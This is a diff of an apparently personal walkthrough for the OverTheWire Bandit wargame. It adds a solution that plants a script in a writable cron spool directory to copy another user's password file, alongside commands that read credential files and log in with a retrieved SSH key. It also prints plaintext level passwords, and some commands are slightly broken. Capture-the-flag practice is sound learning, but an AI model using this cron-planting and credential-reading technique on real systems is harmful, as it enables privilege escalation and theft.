@@ -68,9 +68,9 @@ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 ```
 ### bandit12>13
 ```
-mkdir /tmp/ao3488
-cp data.txt /tmp/ao3488/
-cd /tmp/ao3488
+mkdir /tmp/xx88
+cp data.txt /tmp/xx88/
+cd /tmp/xx88
 man xxd
 xxd -r data.txt > data
 file data
@@ -117,16 +117,16 @@ cluFn7wTiGryunymYOu4RcffSxQluehd
 nmap -n -Pn -p 31000-32000 127.0.0.1
 nmap -n -Pn -sV -p 31046,31518,31691,31790,31960 127.0.0.1
 cat /etc/bandit_pass/bandit16 | openssl s_client -connect 127.0.0.1:31790 -ign_eof
-mkdir /tmp/ao3489
-cat /etc/bandit_pass/bandit16 | openssl s_client -connect 127.0.0.1:31790 -ign_eof > /tmp/ao3489/ssh_key_bandit17
+mkdir /tmp/xx89
+cat /etc/bandit_pass/bandit16 | openssl s_client -connect 127.0.0.1:31790 -ign_eof > /tmp/xx89/ssh_key_bandit17
 edit the file and remain the private key part
-vi /tmp/ao3489/ssh_key_bandit17
+vi /tmp/xx89/ssh_key_bandit17
 ```
 change the permissions of ssh key file
 Keys need to be only accessible by you
 ```
-chmod 600 /tmp/ao3489/ssh_key_bandit17
-ssh localhost -i /tmp/ao3489/ssh_key_bandit17 -l bandit17
+chmod 600 /tmp/xx89/ssh_key_bandit17
+ssh localhost -i /tmp/xx89/ssh_key_bandit17 -l bandit17
 ```
 ### bandit17>18
 ```
@@ -208,5 +208,35 @@ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ```
 ### bandit23>24
-
-
+examine the */etc/cron.d*
+```
+$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+*cronjob_bandit24.sh* script executes all scripts in */var/spool/bandit24* directory
+check the directory permissions
+```
+$ ls -al /var/spool/
+drwx-wx--- 18 bandit24 bandit23 4096 Jan 24 20:29 bandit24
+```
+bandit23 can not read but write to the */var/spool/bandit24* directory,
+so I can write a simple script and cp to this directory
+script content
+```
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/xx23/pass24
+```
+change script and /tmp/xx24 directory permissions for bandit24 to write to
+```
+$ chmod 777 test.sh
+$ chmod /tmp/xx24
+```
+cp this script to */var/spool/bandit24*
+```
+$ cp /tmp/xx23/test.sh /var/spool/bandit24
+```
+wait a minute and read pass24
+```
+$ cat pass24
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
